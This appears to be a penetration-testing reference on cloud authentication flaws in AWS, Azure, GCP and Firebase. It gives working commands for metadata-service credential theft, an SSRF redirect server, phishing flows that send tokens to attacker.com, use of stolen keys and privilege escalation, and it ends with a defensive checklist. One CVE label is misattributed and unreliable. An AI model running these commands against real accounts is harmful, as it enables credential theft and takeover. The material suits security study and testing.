# Cloud Platform Authentication Vulnerabilities

## Overview

This document covers authentication and authorization vulnerabilities specific to major cloud platforms (AWS, Azure, GCP, Firebase), including misconfigurations, credential exposure, and exploitation techniques.

---

## 1. Amazon Web Services (AWS)

### 1.1 IAM Credential Exposure

#### Common Credential Locations
```bash
# Local file system
~/.aws/credentials
~/.aws/config
/etc/boto.cfg
/root/.aws/credentials

# Environment variables
AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN
AWS_SECURITY_TOKEN

# Instance metadata (IMDSv1 - vulnerable)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# EC2 user data (may contain credentials)
curl http://169.254.169.254/latest/user-data/
```

#### IMDS Exploitation (CVE-2019-11246 Pattern)
```bash
# IMDSv1 SSRF attack
# Vulnerable application makes request to attacker-controlled URL
# Attacker redirects to metadata service

# Step 1: Create redirect server
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')
        self.end_headers()
HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
"

# Step 2: Exploit SSRF vulnerability
curl "http://vulnerable-app.com/fetch?url=http://attacker-server:8080/"

# Response reveals IAM role name, then fetch credentials
curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
```

#### Credential Discovery in Code/Config
```bash
# Search git repositories
trufflehog git https://github.com/target/repo --only-verified
gitleaks detect -v

# Search file system
grep -r "AKIA" .  # AWS Access Key ID prefix
grep -r "aws_secret_access_key" .
grep -r "AWS_ACCESS_KEY" .

# Common patterns to search
AKIA[A-Z0-9]{16}  # Access Key ID
[A-Za-z0-9/+=]{40}  # Secret Access Key (base64-like)
```

#### Credential Validation & Enumeration
```bash
# Validate stolen credentials
aws sts get-caller-identity \
    --access-key AKIAXXXXXXXXXXXXXXXX \
    --secret-key XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

# Enumerate permissions (using Pacu)
pacu
> import_keys AKIAXXXXX SECRETXXXXX
> run iam__enum_permissions
> run iam__privesc_scan

# Manual enumeration
aws iam list-users
aws iam list-roles
aws iam list-policies
aws iam get-user
aws iam list-attached-user-policies --user-name <username>
```

### 1.2 Cognito Misconfiguration

#### Insecure User Pool Configuration
```bash
# Enumerate Cognito configuration
# Found in mobile apps, JavaScript source
aws cognito-idp describe-user-pool --user-pool-id us-east-1_XXXXXXXX

# Self-registration enabled (should be disabled for private apps)
aws cognito-idp sign-up \
    --client-id XXXXXXXXXXXXXXXXXXXXXXXXXX \
    --username attacker@evil.com \
    --password AttackerPass123! \
    --user-attributes Name=email,Value=attacker@evil.com

# Confirm without verification (if auto-confirm enabled)
aws cognito-idp confirm-sign-up \
    --client-id XXXXXXXXXXXXXXXXXXXXXXXXXX \
    --username attacker@evil.com \
    --confirmation-code 123456  # Or may not be required
```

#### Identity Pool Misconfiguration
```bash
# Unauthenticated identity access
# Get identity ID without authentication
aws cognito-identity get-id \
    --identity-pool-id us-east-1:XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX

# Get credentials for unauthenticated role
aws cognito-identity get-credentials-for-identity \
    --identity-id us-east-1:XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX

# Check what unauthenticated role can do
# These credentials may have excessive permissions
```

#### Custom Attribute Manipulation
```bash
# If custom attributes are writable by user
aws cognito-idp update-user-attributes \
    --access-token <user_access_token> \
    --user-attributes Name=custom:role,Value=admin Name=custom:tenant_id,Value=other_tenant

# Admin attributes that should be protected
# custom:role, custom:permissions, custom:tenant_id, etc.
```

#### Client Secret Exposure
```javascript
// Found in mobile apps/JavaScript - should never be exposed
const cognitoConfig = {
    UserPoolId: 'us-east-1_XXXXXXXX',
    ClientId: 'XXXXXXXXXXXXXXXXXXXXXXXXXX',
    ClientSecret: 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'  // Sensitive!
};

// With client secret, can interact with all client operations
```

### 1.3 STS Token Issues

#### AssumeRole Abuse
```bash
# Check for overly permissive trust policies
aws iam get-role --role-name target-role

# Trust policy allowing any AWS account
{
    "Effect": "Allow",
    "Principal": {"AWS": "*"},  # Dangerous!
    "Action": "sts:AssumeRole"
}

# Exploit: Assume role from attacker's account
aws sts assume-role \
    --role-arn arn:aws:iam::TARGET_ACCOUNT:role/target-role \
    --role-session-name attacker-session
```

#### Session Token Hijacking
```bash
# If STS tokens are logged/exposed
# They include: AccessKeyId, SecretAccessKey, SessionToken

# Use stolen session credentials
export AWS_ACCESS_KEY_ID="ASIAXXXXXXXXXXX"
export AWS_SECRET_ACCESS_KEY="XXXXXXXXXXXXXXXXXXXX"
export AWS_SESSION_TOKEN="FwoGZXIvYXdzEBYaDLxxxxxxx..."

aws sts get-caller-identity
```

#### OIDC Provider Misconfiguration
```bash
# Insecure OIDC trust: any GitHub action can assume role
{
    "Effect": "Allow",
    "Principal": {"Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
        "StringEquals": {
            "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        }
        # Missing: repository/branch condition!
    }
}

# Exploit: Create repo/action to assume role
# Attacker's GitHub action can get AWS credentials
```

### 1.4 Cross-Account Access

#### Resource-Based Policy Abuse
```bash
# S3 bucket with cross-account access
aws s3api get-bucket-policy --bucket target-bucket

{
    "Effect": "Allow",
    "Principal": {"AWS": "*"},  # Public!
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::target-bucket/*"
}

# Access from any account
aws s3 ls s3://target-bucket/ --no-sign-request
aws s3 cp s3://target-bucket/sensitive.txt . --no-sign-request
```

#### Lambda Resource Policy
```bash
# Check Lambda permissions
aws lambda get-policy --function-name target-function

# Invoke from unauthorized account if policy allows
aws lambda invoke \
    --function-name arn:aws:lambda:us-east-1:TARGET:function:target-function \
    --payload '{"exploit": true}' \
    output.txt
```

---

## 2. Microsoft Azure

### 2.1 Azure AD Misconfiguration

#### Tenant Enumeration
```bash
# Check if domain uses Azure AD
curl "https://login.microsoftonline.com/<domain>/v2.0/.well-known/openid-configuration"
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@domain.com&xml=1"

# Enumerate tenant ID
curl "https://login.microsoftonline.com/<domain>/.well-known/openid-configuration" | jq .

# User enumeration (if not blocked)
# Response time differences reveal valid usernames
```

#### Application Registration Vulnerabilities
```powershell
# Applications with dangerous permissions
# Check for: Directory.ReadWrite.All, Application.ReadWrite.All, RoleManagement.ReadWrite.Directory

# Using Azure CLI
az ad app list --query "[].{name:displayName, appId:appId}" -o table
az ad app permission list --id <app-id>

# Consent grant abuse
# If user consent is enabled, phish users to consent to malicious app
# Request permissions like: Mail.Read, Files.ReadWrite.All
```

#### OAuth 2.0 Misconfiguration
```bash
# Device code phishing
# Legitimate-looking prompt to enter code on Microsoft site
POST https://login.microsoftonline.com/common/oauth2/devicecode
Content-Type: application/x-www-form-urlencoded

client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.microsoft.com

# Response contains user_code - phish victim to enter this
# Poll for token completion

# Implicit flow token theft (if enabled)
# Redirect URI manipulation
GET https://login.microsoftonline.com/{tenant}/oauth2/authorize?
    client_id={client-id}&
    response_type=token&
    redirect_uri=https://attacker.com/callback&  # If not validated
    scope=openid
```

#### Guest User Abuse
```powershell
# Guest users may have excessive permissions
# Enumerate as guest
az ad user list
az ad group list
az ad app list

# Guest can often read directory information
# Check for sensitive data exposure
```

### 2.2 Managed Identity Abuse

#### IMDS Exploitation
```bash
# Azure Instance Metadata Service
# Get managed identity token
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Get multiple resource tokens
# management.azure.com - Azure Resource Manager
# vault.azure.net - Key Vault
# storage.azure.com - Storage
# database.windows.net - SQL Database
# graph.microsoft.com - Microsoft Graph

curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"
```

#### User-Assigned Identity Abuse
```bash
# If VM has multiple identities, specify which to use
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<client-id>"

# Enumerate available identities
curl -H "Metadata: true" \
    "http://169.254.169.254/metadata/instance?api-version=2020-09-01" | jq .compute.identity
```

#### Function App Identity
```python
# Azure Function with managed identity
import azure.functions as func
from azure.identity import DefaultAzureCredential
from azure.keyvault.secrets import SecretClient

def main(req: func.HttpRequest) -> func.HttpResponse:
    # This uses the function's managed identity
    credential = DefaultAzureCredential()
    client = SecretClient(vault_url="https://vault.vault.azure.net/", credential=credential)

    # If function is compromised, attacker gets identity access
    secret = client.get_secret("sensitive-secret")
    return func.HttpResponse(secret.value)  # Dangerous!
```

### 2.3 Service Principal Issues

#### Client Secret Exposure
```bash
# Service principal credentials in code/config
AZURE_CLIENT_ID=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
AZURE_CLIENT_SECRET=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
AZURE_TENANT_ID=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx

# Authenticate with exposed credentials
az login --service-principal \
    -u $AZURE_CLIENT_ID \
    -p $AZURE_CLIENT_SECRET \
    --tenant $AZURE_TENANT_ID

# Check permissions
az role assignment list --assignee $AZURE_CLIENT_ID
```

#### Certificate-Based Auth Exploitation
```bash
# If certificate file and password are exposed
az login --service-principal \
    -u <client-id> \
    -p /path/to/cert.pem \
    --tenant <tenant-id>

# Certificate extraction from Key Vault (if accessible)
az keyvault certificate download \
    --vault-name vault-name \
    --name cert-name \
    -f cert.pem
```

#### Excessive Permissions
```powershell
# Dangerous built-in roles to look for:
# - Owner
# - Contributor
# - User Access Administrator
# - Global Administrator (Azure AD)

# Check service principal role assignments
az role assignment list --all --query "[?principalType=='ServicePrincipal']"

# Privilege escalation via User Access Administrator
# Can grant self any role
az role assignment create \
    --assignee <attacker-sp-id> \
    --role "Owner" \
    --scope /subscriptions/<subscription-id>
```

### 2.4 Conditional Access Bypass

#### Legacy Authentication Bypass
```bash
# If legacy auth not blocked, use older protocols
# IMAP/POP3/SMTP - bypass MFA

# Test legacy auth
curl -u 'user@domain.com:password' \
    "https://outlook.office365.com/api/v2.0/me/messages"

# PowerShell with basic auth
$cred = Get-Credential
Connect-ExchangeOnline -Credential $cred  # Legacy method
```

#### Device Compliance Bypass
```bash
# If Conditional Access requires compliant device
# but doesn't check for all access methods

# Try different client apps
# - Mobile apps may have different policies
# - Browser vs desktop app
# - Different OAuth scopes may bypass

# TokenTactics - manipulate access tokens
# Convert Graph token to Azure Management token
```

#### Location-Based Bypass
```bash
# If trusted location is configured
# Use VPN/proxy in trusted IP range

# Check current policies (requires access)
az ad conditional-access policy list

# Named locations
az rest --method GET \
    --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations"
```

---

## 3. Google Cloud Platform (GCP)

### 3.1 Service Account Exposure

#### Key File Discovery
```bash
# Service account key files
# JSON format with private key
{
    "type": "service_account",
    "project_id": "project-name",
    "private_key_id": "key-id",
    "private_key": "-----BEGIN PRIVATE KEY-----\n...",
    "client_email": "sa@project.iam.gserviceaccount.com",
    "client_id": "123456789",
    ...
}

# Search for exposed keys
find / -name "*.json" -exec grep -l "private_key" {} \; 2>/dev/null
grep -r "PRIVATE KEY" . --include="*.json"
trufflehog filesystem . --only-verified
```

#### Metadata Server Exploitation
```bash
# GCP metadata server
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Get access token
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
    | jq -r .access_token

# List available service accounts
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"

# Get all instance attributes
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true"
```

#### Service Account Impersonation
```bash
# If user has iam.serviceAccounts.getAccessToken permission
gcloud auth print-access-token --impersonate-service-account=sa@project.iam.gserviceaccount.com

# Check who can impersonate
gcloud iam service-accounts get-iam-policy sa@project.iam.gserviceaccount.com

# Dangerous role: roles/iam.serviceAccountTokenCreator
```

### 3.2 Workload Identity Issues

#### Kubernetes to GCP Escalation
```bash
# GKE Workload Identity misconfiguration
# Pod can access GCP service account

# Check workload identity binding
kubectl describe serviceaccount <ksa-name>
# Look for: iam.gke.io/gcp-service-account annotation

# From compromised pod, get GCP token
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

#### Default Service Account Abuse
```bash
# Compute Engine default service account
# Often has Project Editor role (very broad)

# Check default SA permissions
gcloud projects get-iam-policy PROJECT_ID \
    --flatten="bindings[].members" \
    --filter="bindings.members:PROJECT_NUMBER-compute@developer.gserviceaccount.com"

# GKE default SA
# GKE nodes use Compute Engine default SA by default
```

### 3.3 OAuth Consent Screen Abuse

#### Unverified App Exploitation
```bash
# OAuth consent screen phishing
# Create OAuth app requesting sensitive scopes:
# - https://www.googleapis.com/auth/drive
# - https://www.googleapis.com/auth/gmail.readonly
# - https://www.googleapis.com/auth/calendar

# Internal apps may not show warnings
# External unverified apps show warning but users may ignore

# OAuth authorization URL
https://accounts.google.com/o/oauth2/v2/auth?
    client_id=CLIENT_ID&
    redirect_uri=https://attacker.com/callback&
    scope=https://www.googleapis.com/auth/drive&
    response_type=code&
    access_type=offline
```

#### Domain-Wide Delegation Abuse
```bash
# If service account has domain-wide delegation
# Can impersonate any user in the workspace

# Using service account to get user token
from google.oauth2 import service_account

credentials = service_account.Credentials.from_service_account_file(
    'key.json',
    scopes=['https://www.googleapis.com/auth/drive'],
    subject='admin@domain.com'  # Impersonate this user
)

# Access user's data
```

#### Authorized Domain Bypass
```bash
# Check authorized domains in consent screen
# May be possible to register subdomain
# app.authorized-domain.com -> attacker controls subdomain

# Or find open redirect on authorized domain
https://authorized-domain.com/redirect?url=https://attacker.com
```

---

## 4. Firebase

### 4.1 Firebase Auth Bypass

#### Insecure Rules
```javascript
// Firestore rules - completely open
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if true;  // Anyone can read/write!
    }
  }
}

// Realtime Database rules - open
{
  "rules": {
    ".read": true,   // Public read
    ".write": true   // Public write
  }
}

// Storage rules - open
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /{allPaths=**} {
      allow read, write: if true;  // Public access
    }
  }
}
```

#### Firebase Config Exposure
```javascript
// Firebase config in client-side JavaScript
const firebaseConfig = {
    apiKey: "AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
    authDomain: "project.firebaseapp.com",
    projectId: "project-id",
    storageBucket: "project.appspot.com",
    messagingSenderId: "123456789",
    appId: "1:123456789:web:abcdef"
};

// API key is intended to be public BUT
// Check for unrestricted API key usage:
# Test if API key works for other Google services
curl "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=AIzaSyXXX"
```

#### Enumeration with Config
```bash
# With Firebase config, access data
# Using REST API

# List Firestore collections
curl "https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents/COLLECTION"

# Realtime Database
curl "https://PROJECT_ID.firebaseio.com/.json"
curl "https://PROJECT_ID.firebaseio.com/users.json"

# Storage bucket
gsutil ls gs://PROJECT_ID.appspot.com/
```

### 4.2 Custom Token Issues

#### Custom Token Generation Flaw
```javascript
// Server generates custom token with claims
const admin = require('firebase-admin');

// Vulnerable: Using user-supplied claims
app.post('/getToken', (req, res) => {
    const token = await admin.auth().createCustomToken(req.body.uid, {
        role: req.body.role  // User controls role!
    });
    res.json({ token });
});

// Attack: Request admin role
POST /getToken
{"uid": "attacker", "role": "admin"}
```

#### Service Account Key Exposure
```bash
# Firebase Admin SDK requires service account key
# If exposed, attacker can:
# 1. Generate custom tokens for any user
# 2. Access Firebase services with admin privileges

# Find exposed keys
find . -name "serviceAccountKey.json"
find . -name "*firebase*admin*.json"
grep -r "firebase-adminsdk" . --include="*.json"
```

#### Token Verification Bypass
```javascript
// Vulnerable: Not verifying token properly
app.get('/api/data', async (req, res) => {
    const token = req.headers.authorization?.split('Bearer ')[1];

    // Wrong: Decoding without verification
    const decoded = jwt.decode(token);  // No signature check!

    // Correct way:
    const verified = await admin.auth().verifyIdToken(token);
});
```

### 4.3 Anonymous Auth Escalation

#### Anonymous to Authenticated Escalation
```javascript
// Firebase anonymous auth
firebase.auth().signInAnonymously();

// Vulnerability: Anonymous user data not cleaned up when converting
// Data created as anonymous may persist with new account

// Check for privilege escalation
// 1. Create anonymous account
// 2. Create data with elevated permissions
// 3. Convert to permanent account
// 4. Check if data/permissions persist
```

#### Link Provider Abuse
```javascript
// Linking auth providers
const credential = firebase.auth.EmailAuthProvider.credential(email, password);
firebase.auth().currentUser.linkWithCredential(credential);

// Attack scenario:
// 1. Sign in anonymously
// 2. Link to email that doesn't exist
// 3. May bypass email verification
```

#### Session Persistence Issues
```javascript
// Firebase session persistence options
firebase.auth().setPersistence(firebase.auth.Auth.Persistence.LOCAL);   // localStorage
firebase.auth().setPersistence(firebase.auth.Auth.Persistence.SESSION); // sessionStorage
firebase.auth().setPersistence(firebase.auth.Auth.Persistence.NONE);    // Memory only

// LOCAL persistence: tokens stored in localStorage
// XSS can steal tokens
// Check Application > Local Storage for Firebase tokens
```

---

## 5. Cloud Security Testing Tools

### Multi-Cloud Tools
```bash
# ScoutSuite - Multi-cloud security auditing
scout aws
scout azure --cli
scout gcp --service-account key.json

# Prowler - AWS/Azure/GCP security tool
prowler aws
prowler azure
prowler gcp

# CloudSploit - Cloud security scanner
cloudsploit scan --cloud aws
```

### AWS-Specific Tools
```bash
# Pacu - AWS exploitation framework
python3 pacu.py
> import_keys <access_key> <secret_key>
> run iam__enum_permissions
> run iam__privesc_scan
> run lambda__enum

# WeirdAAL - AWS Attack Library
python3 weirdAAL.py -m recon_all

# Enumerate-IAM
python3 enumerate-iam.py --access-key AKIA... --secret-key ...

# S3Scanner
python3 s3scanner.py --buckets buckets.txt
```

### Azure-Specific Tools
```bash
# ROADtools - Azure AD exploration
roadrecon auth -u user@domain.com -p password
roadrecon gather
roadrecon gui

# AzureHound - BloodHound for Azure
azurehound -u user@domain.com -p password list

# MicroBurst - Azure security tools
Import-Module MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base company
Get-AzDomainInfo -folder output
```

### GCP-Specific Tools
```bash
# GCP IAM Privilege Escalation
# Check for privesc paths
python3 gcp_privesc.py --project PROJECT_ID

# Hayat - GCP security scanner
python3 hayat.py --project PROJECT_ID --service-account key.json

# gcp_enum - Enumerate GCP resources
python3 gcp_enum.py
```

---

## 6. Cloud Security Checklist

### AWS Security
```yaml
IAM:
  - [ ] Enable MFA for all users, especially root
  - [ ] Use IAM roles instead of access keys where possible
  - [ ] Implement least privilege policies
  - [ ] Rotate access keys regularly
  - [ ] Enable CloudTrail for auditing
  - [ ] Use IMDSv2 (require token for metadata)
  - [ ] Review cross-account access regularly

Cognito:
  - [ ] Disable self-registration if not needed
  - [ ] Require email/phone verification
  - [ ] Use secure password policies
  - [ ] Review custom attributes for sensitivity
  - [ ] Limit unauthenticated identity permissions
  - [ ] Keep client secrets server-side

STS:
  - [ ] Review trust policies for AssumeRole
  - [ ] Use condition keys to restrict access
  - [ ] Monitor for unusual role assumption
  - [ ] Set appropriate session duration limits
```

### Azure Security
```yaml
Azure AD:
  - [ ] Enable MFA for all users
  - [ ] Disable legacy authentication
  - [ ] Review application permissions
  - [ ] Implement Conditional Access policies
  - [ ] Monitor sign-in logs
  - [ ] Review guest user permissions
  - [ ] Audit service principal permissions

Managed Identity:
  - [ ] Use managed identities over service principals
  - [ ] Apply least privilege to identity roles
  - [ ] Monitor identity usage
  - [ ] Review RBAC assignments regularly

Service Principals:
  - [ ] Rotate client secrets regularly
  - [ ] Use certificates over secrets
  - [ ] Monitor for exposed credentials
  - [ ] Implement credential rotation policies
```

### GCP Security
```yaml
Service Accounts:
  - [ ] Minimize service account key usage
  - [ ] Use Workload Identity where possible
  - [ ] Rotate keys regularly
  - [ ] Monitor key creation/usage
  - [ ] Apply least privilege IAM roles
  - [ ] Disable unused service accounts

OAuth:
  - [ ] Verify OAuth applications
  - [ ] Review authorized domains
  - [ ] Monitor consent grants
  - [ ] Restrict domain-wide delegation
  - [ ] Audit third-party app access
```

### Firebase Security
```yaml
Authentication:
  - [ ] Enable email verification
  - [ ] Implement proper security rules
  - [ ] Test rules with Firebase emulator
  - [ ] Monitor authentication events
  - [ ] Restrict API key usage

Security Rules:
  - [ ] Never use allow read, write: if true
  - [ ] Validate user authentication in rules
  - [ ] Validate data structure and content
  - [ ] Test rules thoroughly before deployment
  - [ ] Use Firebase App Check
```

---

## References

- AWS Security Best Practices: https://docs.aws.amazon.com/wellarchitected/latest/security-pillar/
- Azure Security Documentation: https://docs.microsoft.com/en-us/azure/security/
- GCP Security Best Practices: https://cloud.google.com/security/best-practices
- Firebase Security Rules: https://firebase.google.com/docs/rules
- HackTricks Cloud: https://cloud.hacktricks.xyz/
- Rhino Security Labs Research: https://rhinosecuritylabs.com/
- SpecterOps Azure Research: https://posts.specterops.io/
